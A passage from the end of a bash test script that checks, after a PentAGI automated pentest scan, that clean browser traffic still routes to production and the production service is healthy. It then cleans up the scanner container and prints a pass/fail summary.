        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} PentAGI UA not found in Nginx log (may use generic UA in real mode)\n"
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Nginx access log not found at ./nginx_logs/access.log\n"
fi

# =============================================================================
# PHASE 6 – Production Isolation Verification
# =============================================================================
# After all PentAGI traffic, verify a clean browser session routes to
# production and the production service is unaffected.
# =============================================================================
banner "Phase 6 – Production Isolation Verification"

JAR_CLEAN="$(mktemp /tmp/pentagi_clean_XXXXXX.txt)"

_clean_route=$(curl --silent --include \
    --cookie "${JAR_CLEAN}" --cookie-jar "${JAR_CLEAN}" \
    --max-time 15 \
    --request GET "${BASE_URL}/" \
    --header "X-Internal-Test-Auth: ${INTERNAL_TEST_SECRET}" \
    --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    2>/dev/null | grep -i "^x-route-target:" | tr -d '\r' | awk '{print $2}' | head -1) || _clean_route=""

TOTAL=$((TOTAL + 1))
if [ "${_clean_route}" = "production" ] || [ "${_clean_route}" = "" ]; then
    printf "  ${GREEN}[PASS]${NC} Clean browser session routes to production (route=%s)\n" \
           "${_clean_route:-not-set}"
    PASS=$((PASS + 1))
else
    printf "  ${RED}[FAIL]${NC} Clean session routed to '%s' – expected production\n" "${_clean_route}"
    FAIL=$((FAIL + 1))
fi

rm -f "${JAR_CLEAN}"

# Confirm production homepage is still healthy.
TOTAL=$((TOTAL + 1))
_prod_status=$(curl --silent --output /dev/null \
    --write-out "%{http_code}" \
    --max-time 15 \
    --request GET "${BASE_URL}/" \
    --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
    2>/dev/null) || _prod_status="000"

if [ "${_prod_status}" = "200" ] || [ "${_prod_status}" = "301" ] || [ "${_prod_status}" = "302" ]; then
    printf "  ${GREEN}[PASS]${NC} Production service healthy after PentAGI scan (HTTP %s)\n" "${_prod_status}"
    PASS=$((PASS + 1))
else
    printf "  ${RED}[FAIL]${NC} Production service returned HTTP %s after scan (check health)\n" "${_prod_status}"
    FAIL=$((FAIL + 1))
fi

# ---------------------------------------------------------------------------
# Cleanup: stop PentAGI container if it is still running.
# ---------------------------------------------------------------------------
if [ -n "${PENTAGI_CONTAINER_ID}" ] && command -v docker >/dev/null 2>&1; then
    _state=$(docker inspect "${PENTAGI_CONTAINER_ID}" \
        --format '{{.State.Status}}' 2>/dev/null) || _state=""
    if [ "${_state}" = "running" ]; then
        printf "\n  Stopping PentAGI container %s...\n" "${PENTAGI_CONTAINER_ID}"
        docker stop "${PENTAGI_CONTAINER_ID}" >/dev/null 2>&1 || true
    fi
    docker rm -f "${PENTAGI_CONTAINER_ID}" >/dev/null 2>&1 || true
fi

# ---------------------------------------------------------------------------
# Final report
# ---------------------------------------------------------------------------
banner "Scenario 09 – PentAGI Final Report"
printf "Mode         : %s\n" "${PENTAGI_MODE}"
printf "Report dir   : %s\n" "${WORK_DIR}"
printf "Total checks : %d\n" "${TOTAL}"
printf "${GREEN}Passed       : %d${NC}\n" "${PASS}"
printf "${YELLOW}Skipped      : %d${NC}\n" "${SKIP}"
if [ "${FAIL}" -gt 0 ]; then
    printf "${RED}Failed       : %d${NC}\n" "${FAIL}"
else
    printf "Failed       : 0\n"
fi

printf "\nPentAGI report files:\n"
ls -1 "${WORK_DIR}" 2>/dev/null || true

printf "\n"
if [ "${FAIL}" -eq 0 ]; then
    printf "${GREEN}SCENARIO PASSED – PentAGI scan completed; expected findings verified; production intact.${NC}\n"
    exit 0
else
    printf "${RED}SCENARIO FAILED – %d check(s) did not pass.${NC}\n" "${FAIL}"
    exit 1
fi